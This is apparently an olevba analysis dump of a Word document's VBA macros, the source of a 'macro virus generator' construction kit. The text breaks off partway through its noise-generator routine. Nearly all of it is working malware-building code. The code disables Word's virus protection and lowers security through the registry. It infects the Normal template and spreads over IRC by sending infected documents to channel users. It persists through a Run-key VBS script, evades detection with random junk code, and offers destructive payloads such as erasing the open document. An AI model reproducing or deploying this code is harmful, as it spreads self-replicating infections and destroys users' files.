olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Constructor.MSWord.WMVG.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WMVG.frm 
in file: Constructor.MSWord.WMVG.a - OLE stream: 'Macros/VBA/WMVG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



' ************************************
' WalruS Macro Virus Generator (WMVG)
' Version 1.00
' By The WalruS 10/00
' ************************************

' Help Buttons
Private Sub CommandButton1_Click()
MsgBox "The Virus Will Infect When The Document Is Opened", vbInformation, "WMVG"
End Sub

Private Sub CommandButton10_Click()
MsgBox "The Virus Payload Will Be A Simple Message Box", vbInformation, "WMVG"
End Sub

Private Sub CommandButton11_Click()
MsgBox "The Virus Payload Will Be To Give Word Hiccups :-)", vbInformation, "WMVG"
End Sub

Private Sub CommandButton12_Click()
MsgBox "The Virus Payload Will Be To Open & Close The CD Tray Continously", vbInformation, "WMVG"
End Sub

Private Sub CommandButton13_Click()
MsgBox "The Virus Payload Will Change The Windows" & vbCr & "System Colours Until The PC Is Rebooted", vbInformation, "WMVG"
End Sub

Private Sub CommandButton14_Click()
MsgBox "The Virus Payload Will Delete The Document Being Viewed." & vbCr & Application.UserName & " Is An Evil Bastard ;-)", vbInformation, "WMVG"
End Sub

Private Sub CommandButton15_Click()
MsgBox "The Virus Payload Will Be To Make The Office Assistant Say A Message", vbInformation, "WMVG"
End Sub

Private Sub CommandButton17_Click()
OptionButton15.Value = True
WMVG.Hide
WMVGPayloadAssistant.Show
End Sub

Private Sub CommandButton19_Click()
OptionButton10.Value = True
WMVG.Hide
WMVGPayloadMsg.Show
End Sub

Private Sub CommandButton2_Click()
MsgBox "The Virus Will Infect When The Document Is Closed", vbInformation, "WMVG"
End Sub

Private Sub CommandButton32_Click()
MsgBox "The Virus Will Be Able To Spread On IRC As A Worm", vbInformation, "WMVG"
End Sub

Private Sub CommandButton33_Click()
MsgBox "The Virus Wont Be Able To Spread On IRC!", vbInformation, "WMVG"
End Sub

Private Sub CommandButton48_Click()
MsgBox "The Virus Will Be Backed Up On Reboot" & vbCr & "Therefore Making It Harder To Get Rid Off", vbInformation, "WMVG"
End Sub

Private Sub CommandButton49_Click()
MsgBox "The Virus Wont Have VBS Backup!", vbInformation, "WMVG"
End Sub

Private Sub CommandButton5_Click()
MsgBox "The Virus Wont Have Any Stealth", vbInformation, "WMVG"
End Sub

Private Sub CommandButton6_Click()
MsgBox "The Virus Will Have Limited Stealth" & vbCr & "It Will Disable Alt-F11 Key Presses", vbInformation, "WMVG"
End Sub

Private Sub CommandButton62_Click()
MsgBox "The Payload Runs On A Date Set By You", vbInformation, "WMVG"
End Sub

Private Sub CommandButton63_Click()
MsgBox "The Payload Runs At Random", vbInformation, "WMVG"
End Sub

Private Sub CommandButton65_Click()
MsgBox "The Payload Runs Everytime The Documents Infection Hook Is Run", vbInformation, "WMVG"
End Sub

Private Sub CommandButton72_Click()
OptionButton58.Value = True
WMVG.Hide
WMVGPayloadDate.Show
End Sub

Private Sub CommandButton73_Click()
WMVG.Hide
WMVGExit.Show
End Sub

Private Sub CommandButton74_Click()
WMVG.Hide
WMVGAbout.Show
End Sub

Private Sub CommandButton75_Click()
' Extras
WMVG.Hide
WMVGExtras.Show
End Sub

Private Sub CommandButton76_Click()
' Generate
Call GenerateClassVirus
End Sub

Private Sub CommandButton77_Click()
MsgBox "The Virus Copies Its Code Directly Using String Copy", vbInformation, "WMVG"
End Sub

Private Sub CommandButton78_Click()
MsgBox "The Virus Copies Its Code To A File And Infects From There", vbInformation, "WMVG"
End Sub

Private Sub CommandButton79_Click()
OptionButton59.Value = True
WMVG.Hide
WMVGPayloadRandom.Show
End Sub

Private Sub CommandButton80_Click()
MsgBox "Enter Your Own Payload Code", vbInformation, "WMVG"
End Sub

Private Sub CommandButton81_Click()
OptionButton67.Value = True
WMVG.Hide
WMVGPayloadPlugin.Show
End Sub

Private Sub CommandButton82_Click()
MsgBox "The Virus Will Have Random Noise Added To It" & vbCr & "This Will Make The Virus More Unique And Harder To Detect", vbInformation, "WMVG"
End Sub

Private Sub CommandButton83_Click()
MsgBox "The Source Code Will Be Generated In" & vbCr & "C:\My Documents", vbInformation, "WMVG"
End Sub

Private Sub CommandButton9_Click()
MsgBox "The Virus Wont Have A Payload", vbInformation, "WMVG"
End Sub

Private Sub Frame11_Click()

End Sub

Private Sub Frame16_Click()

End Sub

Private Sub Frame17_Click()

End Sub

Private Sub Frame18_Click()

End Sub

Private Sub Frame3_Click()

End Sub

Private Sub Frame7_Click()

End Sub

Private Sub OptionButton12_Click()

End Sub

Private Sub OptionButton15_Click()

End Sub

Private Sub OptionButton2_Click()

End Sub

Private Sub OptionButton3_Click()

End Sub

Private Sub OptionButton28_Click()

End Sub

Private Sub OptionButton29_Click()

End Sub

Private Sub OptionButton44_Click()

End Sub

Private Sub OptionButton58_Click()

End Sub

Private Sub OptionButton59_Click()

End Sub

Private Sub OptionButton64_Click()

End Sub

Private Sub OptionButton7_Click()

End Sub

Private Sub OptionButton60_Click()

End Sub

Private Sub OptionButton66_Click()

End Sub

Private Sub OptionButton9_Click()

End Sub

Private Sub OptionButton77_Click()
MsgBox "The Virus Will Have Visual Basic Script Backup On Reboot", vbInformation, "WMVG"
End Sub

Private Sub OptionButton78_Click()
MsgBox "The Virus Wont Have VBS Backup", vbInformation, "WMVG"
End Sub

Private Sub TextBox1_Change()

End Sub

Private Sub UserForm_Click()

End Sub

Private Sub GenerateClassVirus()

' Generate The Variables
Call WallysVariableNameGenerator(Variable1, Variable2, Variable3, Variable4, Variable5, Variable6)


' Check Infect On For Error
If OptionButton1.Value = OptionButton2.Value Then
    MsgBox "Please Select An Infection Method", vbInformation, "Doh!"
    GoTo EndSub
End If

' Check Infection Type For Error
If OptionButton65.Value = OptionButton66.Value Then
    MsgBox "Please Select The Infection Method", vbInformation, "One Or The Other"
    GoTo EndSub
End If

' Make Sure Stealth Is Not Flagged
If OptionButton5.Value Or OptionButton6.Value = True Then
    Stealth = "Good"
End If

' Check Stealth For Error
If Stealth = "Error" Then
    MsgBox "Please Select The Stealth Level", vbInformation, "Doh!"
    GoTo EndSub
End If

' Check Infect IRC For Error
If OptionButton28.Value = OptionButton29.Value Then
    MsgBox "Please State If IRC Spreading Is Required", vbInformation, "Wake Up!"
    GoTo EndSub
End If

' Check VBS Backup For Error
If OptionButton44.Value = OptionButton45.Value Then
    MsgBox "Please State If VBS Backup Is Required", vbInformation, "You A Script Kiddie?"
    GoTo EndSub
End If

' Virus Author
VirusAuthor = TextBox1.Text

' Check Virus Author For Error
If TextBox1 = "" Then
    MsgBox "Please Enter Virus Authors Name", vbInformation, "Dont Ya Know Yer Name!"
    GoTo EndSub
End If

' Virus Name
VirusName = TextBox2.Text

' Check Virus Name For Error
If TextBox2.Text = "" Then
    MsgBox "Please Enter The Virus Name", vbInformation, "Christen It Then!"
    GoTo EndSub
End If

' Virus Payload
If OptionButton9.Value = True Then
    Payload = False
    PayloadTrigger = False
    OptionButton58.Value = False
    OptionButton59.Value = False
    OptionButton60.Value = False
End If

If OptionButton10.Value Or OptionButton11.Value Or OptionButton12.Value Or OptionButton13.Value Or OptionButton14.Value Or OptionButton15.Value Or OptionButton67.Value = True Then Payload = True

' Check Payload For Error
If Payload = Error Then
    MsgBox "Please Select Whether A Payload Is Required Or Not", vbInformation, "Get With It"
    GoTo EndSub
End If

' Payload Trigger
If OptionButton58.Value Or OptionButton59.Value Or OptionButton60.Value = True Then PayloadTrigger = True

' Check Payload Trigger For Error
If Payload = True And PayloadTrigger = False Then
    MsgBox "Please Select A Payload Trigger Or Select No Payload", vbInformation, "Make Yer Mind Up"
    GoTo EndSub
End If

' Check To Ensure Month Is Entered If Date Has Been Selected
If OptionButton58.Value = True And PayloadMonth = 0 Then
    MsgBox "Please Select A Valid Month Or Select Another Trigger", vbInformation, "Idiot"
    GoTo EndSub
End If

' Check To Ensure Day Is Entered If Date Has Been Selected
If OptionButton58.Value = True And PayloadDay = 0 Then
    MsgBox "Please Select A Valid Day Or Select Another Trigger", vbInformation, "Idiot"
    GoTo EndSub
End If

' Check Random No Has Been Entered If Random Has Been Selected
If OptionButton59.Value = True And RandomTrigger = 0 Then
    MsgBox "Please Select A Random Number For The Random Payload", vbInformation, "Random Insult Required"
    GoTo EndSub
End If

' Check Message Has Been Entered If Message Payload Has Been Selected
If OptionButton10.Value = True And PayloadMsgText = "" Then
    MsgBox "Please Enter A Message Or Select A Different Payload", vbInformation, "Message Required"
    GoTo EndSub
End If

' Check Message Type Has Been Entered If Message Payload Has Been Selected
If OptionButton10.Value = True And PayloadMsgType = "Error" Then
    MsgBox "Please Enter A Message Type Or Select A Different Payload", vbInformation, "Message Required"
    GoTo EndSub
End If

' Check That Payload Plug Has Been Entered
If OptionButton67.Value = True And PayloadPlugin = "Error" Then
    MsgBox "Please Enter The Code For The Plugin Payload", vbInformation, "Plugin In Code Required"
    GoTo EndSub
End If

' Check That Assistants Message Has Been Entered
If OptionButton15.Value = True And PayloadAssistantMessage = "" Then
    MsgBox "Please Enter The Assistants Message Or Select A Different Payload", vbInformation, "Paperclips Words Please"
    GoTo EndSub
End If

' Check For Virus Of Same Name
Exists = Dir("C:\My Documents\" & VirusName & ".cls")
If Exists <> "" Then
    MsgBox VirusName & " Already Exists" & vbCr & "Please Select Another Name Or Delete" & vbCr & "C:\My Documents\" & VirusName, vbExclamation, "WMVG"
    GoTo EndSub
End If


' Open source file for construction
Open "C:\My Documents\" & VirusName & ".cls" For Append As #1

    ' Marker
    Print #1, "'" ' & VirusName *** Possible ***
    
    ' CD Tray Payload Declare
If Payload = True And OptionButton11.Value = True Then
    Print #1, "Private Declare Function mciSendString Lib ""winmm.dll"" Alias ""mciSendStringA"" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long"
End If

    ' Colours Payload Declare
If Payload = True And OptionButton13.Value = True Then
    Print #1, "Private Declare Function SetSysColors Lib ""user32"" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long"
End If

    ' Infection Hook 1 (Open)
If OptionButton1.Value = True Then
    Print #1, "Private Sub Document_Open()"
End If

    ' Infection Hook 2 (Close)
If OptionButton2.Value = True Then
    Print #1, "Private Sub Document_Close()"
End If

    Call MacroNoiseEngine ' Noise
    
    ' Error Handler
    Print #1, "On Error Resume Next"
    Print #1, ""
        
    ' Virus Details
    Print #1, "' Virus Name : " & VirusName
    Print #1, "' VirusAuthor : " & VirusAuthor
    Print #1, "' Comments : " & TextBox3.Text
    Print #1, "' Date : " & Day(Now) & "/" & Month(Now) & "/" & Year(Now)
    Print #1, ""
    Print #1, "' A Virus Created By The WalruS Macro Virus Generator v1.00 (WMVG)"
    Print #1, ""
    
    Call MacroNoiseEngine ' Noise
    
    ' Word Options
    Print #1, "With Options"
    Print #1, "     .VirusProtection = 0"
    Print #1, "     .SaveNormalPrompt = 0"
    Print #1, "     .ConfirmConversions = 0"
    Print #1, "End With"
    
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
    
    Print #1, "Application.DisplayStatusBar = False"
    
    Call MacroNoiseEngine ' Noise
    
    Print #1, "ActiveDocument.ReadOnlyRecommended = False"
    
    Call MacroNoiseEngine ' Noise
    
    Print #1, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") = 1&"
    
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
        
    Print #1, " CommandBars(""Macro"").Controls(""Security..."").Enabled = False"
    
    Call MacroNoiseEngine ' Noise
    
    ' Stealth Settings
If OptionButton6.Value = True Then
    Print #1, "KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:="" """
End If

    Call MacroNoiseEngine ' Noise
    
    Print #1, "Set " & Variable1 & " = NormalTemplate.VBProject.VBComponents(1).codemodule"
    
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
    
    Print #1, "Set " & Variable2 & " = ActiveDocument.VBProject.VBComponents(1).codemodule"
    
    ' Infection Routine No 1 (More To Be Added) Variable1 = nor Variable2 = doc
If OptionButton65.Value = True Then
    Print #1, "If " & Variable1 & ".Lines(1, 1) <> ""'"" Then"
    Call MacroNoiseEngine ' Noise
    Print #1, Variable1 & ".DeleteLines 1, " & Variable1 & ".CountOfLines"
    Call MacroNoiseEngine ' Noise
    Print #1, Variable1 & ".InsertLines 1, " & Variable2 & ".Lines(1, " & Variable2 & ".CountOfLines)"
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
    Print #1, "ElseIf " & Variable2 & ".Lines(1, 1) <> ""'"" Then"
    Call MacroNoiseEngine ' Noise
    Print #1, Variable2 & ".DeleteLines 1, " & Variable2 & ".CountOfLines"
    Call MacroNoiseEngine ' Noise
    Print #1, Variable2 & ".InsertLines 1, " & Variable1 & ".Lines(1, " & Variable1 & ".CountOfLines)"
    Call MacroNoiseEngine ' Noise
    Print #1, "ActiveDocument.Save"
    Call MacroNoiseEngine ' Noise
    Print #1, "End If"
    Call MacroNoiseEngine ' Noise
End If
    
    ' Infection Routine No 2 (More To Be Added) Variable1 = nor Variable2 = doc
If OptionButton66.Value = True Then
    Print #1, "Open ""C:\Windows\"" & Application.Username & "".sys"" For Output As #1"
    Call MacroNoiseEngine ' Noise
    Print #1, "Print #1, VBProject.VBComponents(1).codemodule.Lines(1, 150)"
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
    Print #1, "Close #1"
    Print #1, "If " & Variable1 & ".Lines(1, 1) <> ""'"" Then"
    Call MacroNoiseEngine ' Noise
    Print #1, Variable1 & ".DeleteLines 1, " & Variable1 & ".CountOfLines"
    Call MacroNoiseEngine ' Noise
    Print #1, Variable1 & ".AddFromFile (""C:\Windows\"" & Application.Username & "".sys"")"
    Print #1, "NormalTemplate.Save"
    Print #1, "ElseIf " & Variable2 & ".Lines(1, 1) <> ""'"" Then"
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
    Print #1, Variable2 & ".DeleteLines 1, " & Variable2 & ".CountOfLines"
    Print #1, Variable2 & ".AddFromFile (""C:\Windows\"" & Application.Username & "".sys"")"
    Print #1, "ActiveDocument.Save"
    Print #1, "End If"
End If
      
    ' WallyS Lamer Detector
    Print #1, "Set " & Variable3 & " = " & Variable4
      
    ' Infect IRC
If OptionButton28.Value = True Then
    Call MacroNoiseEngine ' Noise
    Print #1, "If System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\WalruS\WMVG"", ""Installed"") <> ""True"" Then"
    Call MacroNoiseEngine ' Noise
    Print #1, "exists = Dir(""c:\mirc\mirc32.exe"")"
    Print #1, "If exists = """" Then"
    Call MacroNoiseEngine ' Noise
    Print #1, "Exit Sub"
    Print #1, "Else"
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
    Print #1, "dropped = Dir(""c:\mirc\download\ReadMe.doc"")"
    Print #1, "If dropped = """" Then ActiveDocument.SaveAs ""c:\mirc\download\ReadMe.doc"""
    Call MacroNoiseEngine ' Noise
    Print #1, "Kill ""c:\mirc\script.ini"""
    Print #1, "Open ""c:\mirc\script.ini"" For Output As #1"
    Print #1, "Print #1, ""[script]"""
    Print #1, "Print #1, ""n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\mirc\download\ReadMe.doc }"""
    Print #1, "Print #1, ""n1=on 1:CONNECT: {"""
    Print #1, "Print #1, ""n2=  /join #virus """
    Print #1, "Print #1, ""n3=  /msg #virus Im Infected With A Virus Created By WMVG"""
    Print #1, "Print #1, ""n4= /part #virus"""
    Print #1, "Print #1, ""n5= /clear"""
    Print #1, "Print #1, ""n6= /motd"""
    Print #1, "Print #1, ""n7= }"""
    Print #1, "Close #1"
    Print #1, "End If"
    Call MacroNoiseEngine ' Noise
    Print #1, "End If"
End If

' VBS Backup
If OptionButton44.Value = True Then
    Print #1, "If System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\WalruS\WMVG"", ""Installed"") <> ""True"" Then"
    Call MacroNoiseEngine ' Noise
    Print #1, "Open ""C:\Windows\Backup.drv"" For Output As #1"
    Print #1, "Print #1, VBProject.VBComponents(1).CodeModule.Lines(1, 100)"
    Print #1, "Close #1"
    Print #1, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"", ""WMVG"") = ""C:\Windows\Backup.vbs"""
    Print #1, "Open ""C:\Windows\Backup.vbs"" For Output As #1"
    Print #1, "Print #1, ""' Backup.vbs for WMVG by The WalruS"""
    Print #1, "Print #1, ""On Error Resume Next"""
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
    Print #1, "Print #1, ""Dim WSHShell"""
    Print #1, "Print #1, ""Set WSHShell = WScript.CreateObject(""""WScript.Shell"""")"""
    Print #1, "Print #1, ""Set Backup = WScript.CreateObject(""""Word.Application"""")"""
    Print #1, "Print #1, ""Backup.Options.VirusProtection = False"""
    Print #1, "Print #1, ""Backup.Options.SaveNormalPrompt = False"""
    Call MacroNoiseEngine ' Noise
    Print #1, "Print #1, ""For x = 1 To Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"""
    Print #1, "Print #1, ""Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"""
    Print #1, "Print #1, ""Next"""
    Print #1, "Print #1, ""Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (""""C:\Windows\Backup.drv"""")"""
    Call MacroNoiseEngine ' Noise
    Print #1, "Print #1, ""Backup.Application.Quit"""
    Print #1, "Close #1"
    Print #1, "End If"
End If

' Payload PayloadDay = Every Day
If OptionButton58.Value = True And PayloadDay = 99 Then
    Call MacroNoiseEngine ' Noise
    Print #1, "If Month(Now) = " & PayloadMonth & " Then Call " & Variable6
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
End If

' Payload PayloadMonth = Every Month
If OptionButton58.Value = True And PayloadMonth = 99 Then
    Call MacroNoiseEngine ' Noise
    Print #1, "If Day(Now) = " & PayloadDay & " Then Call " & Variable6
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
End If

' Payload Trigger 1 (Date)
If OptionButton58.Value = True And EveryVariable = False Then
    Call MacroNoiseEngine ' Noise
    Print #1, "If Month(Now) = " & PayloadMonth & " And Day(Now) = " & PayloadDay & " Then Call " & Variable6
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
End If

' Payload Trigger 2 (Random)
If OptionButton59.Value = True Then
    Call MacroNoiseEngine ' Noise
    Print #1, "Trigger = Int(Rnd * " & RandomTrigger & ")"
    Call MacroNoiseEngine ' Noise
    Print #1, "If Trigger = 3 Then Call " & Variable6
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
End If

' Payload Trigger 3 (Every Run)
If OptionButton60.Value = True Then
    Call MacroNoiseEngine ' Noise
    Print #1, "Call " & Variable6
    Call MacroNoiseEngine ' Noise
End If

    Print #1, "End Sub"
    
' Payload
If Payload = True Then
    Print #1, "Private Sub " & Variable6 & " ()"
    Call MacroNoiseEngine ' Noise
    Print #1, "On Error Resume Next"
End If

' Payload 1 (Message Box)
If OptionButton10.Value = True Then
    Call MacroNoiseEngine ' Noise
    Print #1, "MsgBox """ & PayloadMsgText & """" & ", " & PayloadMsgType & ", " & """" & VirusName & """"
End If

' Payload 2 (CD Tray)
If OptionButton11.Value = True Then
    Call MacroNoiseEngine ' Noise
    Print #1, "Do"
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
    Print #1, "mciSendString ""set cd door open"", 0, 0, 0: mciSendString ""set cd door closed"", 0, 0, 0: mciSendString ""set cd time format tmsf wait"", 0, 0, 0: mciSendString ""open cdaudio alias cd wait shareable"", 0, 0, 0"
    Call MacroNoiseEngine ' Noise
    Print #1, "Loop"
End If

' Payload 3 (Colours)
If OptionButton13.Value = True Then
    Call MacroNoiseEngine ' Noise
    Print #1, "a = SetSysColors(1, 1, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 2, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 3, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 4, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 5, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 6, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 7, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 8, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 9, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 10, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 11, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 12, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 13, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 14, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 15, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 16, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 17, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 18, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 19, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 20, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 21, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 22, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 23, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 24, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 25, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 26, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Print #1, "a = SetSysColors(1, 27, RGB(Rnd * 255, Rnd * 255, Rnd * 255))"
    Call MacroNoiseEngine ' Noise
End If

' Payload 4 (Hiccups)
If OptionButton12.Value = True Then
    Call MacroNoiseEngine ' Noise
    Print #1, "Do"
    Print #1, "DoEvents"
    Call MacroNoiseEngine ' Noise
    Print #1, "Randomize"
    Call MacroNoiseEngine ' Noise
    Print #1, "If Int(Rnd * 10000) = 2 Then"
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
    Print #1, "Word.ActiveDocument.ActiveWindow.WindowState = wdWindowStateMinimize"
    Call MacroNoiseEngine ' Noise
    Print #1, "Word.ActiveDocument.ActiveWindow.WindowState = wdWindowStateMaximize"
    Call MacroNoiseEngine ' Noise
    Print #1, "End If"
    Print #1, "Loop"
End If

' Payload 5 (KillDoc)
If OptionButton14.Value = True Then
    Call MacroNoiseEngine ' Noise
    Print #1, "Selection.WholeStory"
    Call MacroNoiseEngine ' Noise
    Print #1, "Selection.Delete Unit:=wdCharacter, Count:=1"
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
    Print #1, "ActiveDocument.Save"
End If

' Payload 6 (Assistant)
If OptionButton15.Value = True Then
    Print #1, "Assistant.Visible = True"
    Call MacroNoiseEngine ' Noise
    Print #1, "With Assistant.NewBalloon"
    Print #1, ".Icon = msoIconAlert"
    Call MacroNoiseEngine ' Noise
    Print #1, ".Text = """ & PayloadAssistantMessage & """"
    Print #1, ".Heading = """ & VirusName & """"
    Call MacroNoiseEngine ' Noise
    Print #1, ".Show"
    Print #1, "End With"
End If


' Payload 7 (Plugin)
If OptionButton67.Value = True Then
    Call MacroNoiseEngine ' Noise
    Call MacroNoiseEngine ' Noise
    Print #1, PayloadPlugin
    Call MacroNoiseEngine ' Noise
End If

' Payload
If Payload = True Then
    Print #1, "End Sub"
End If

    Close #1
        
' Open document and then infect it, save it and close it
    Documents.Add Template:=NormalTemplate.FullName, NewTemplate:=False
    ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromFile ("C:\My Documents\" & VirusName & ".cls")
    ActiveDocument.SaveAs ("C:\My Documents\" & VirusName & ".doc")
    ActiveDocument.Close

' Keep the source code?
If CheckBox1.Value = False Then
    Kill "C:\My Documents\" & VirusName & ".cls"
End If

' Clean the normal template incase virus infected it
    Clean = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    If Clean > 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Clean
    NormalTemplate.Save

' Hide this form
    WMVG.Hide

' Tell the user that the vxs is made
    MsgBox VirusName & " Has Been Created In C:\My Documents", vbInformation, "Heya " & Application.UserName & "..."
    
' Show Virus Created Form
    WMVGVirusCreated.Show

EndSub:
End Sub

' My Variable Name Generator
Private Sub WallysVariableNameGenerator(Variable1, Variable2, Variable3, Variable4, Variable5, Variable6)
    Randomize
    Variable1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 9999)
    Variable2 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 9999)
    Variable3 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 9999)
    Variable4 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 9999)
    Variable5 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 9999)
    Variable6 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 9999)
End Sub

' My Noise Generator
' This Generator Contains Code Taken From "VicodinES Macro.Poppy Construction Kit v1.0d"
' Kewl

Sub MacroNoiseEngine()

Randomize
 
noisechance = Int(Rnd * 6)

select1 = Int(Rnd * 6)
select2 = Int(Rnd * 6)
select3 = Int(Rnd * 6)
select4 = Int(Rnd * 6)
select5 = Int(Rnd * 6)
select6 = Int(Rnd * 6)
encode1 = Int(Rnd * 9999)
encode2 = Int(Rnd * 9999)
encode3 = Int(Rnd * 9999)
crypt1 = Int(Rnd * 9999)
crypt2 = Int(Rnd * 9999)
crypt3 = Int(Rnd * 9999)

noisevar1$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) & encode1 + crypt1
noisevar2$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22)))
noisevar3$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) & encode3 + crypt3
noisevar4$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22)))
noisevar5$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) & encode2 + crypt2
noisevar6$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) & encode3 + crypt1

' CheckBox2.Value Selects Noise
If CheckBox2.Value = True Then

    If select1 = 1 Then
            Print #1, noisevar1$ + " = " + noisevar2 + " & " + noisevar3 + " & Int(Rnd * " & crypt3 & ")"
    End If
    If select1 = 2 Then
        Print #1, noisevar4$ + " = " + noisevar5 + " & " + noisevar6
    End If
    If select1 = 3 Then
        Print #1, noisevar1$ + " = " + noisevar2 + " & " + noisevar3 + " & Int(Rnd * " & crypt1 & ")"
    End If
    If select1 = 4 Then
        Print #1, noisevar4$ + " = " + noisevar5 + " & " + noisevar6
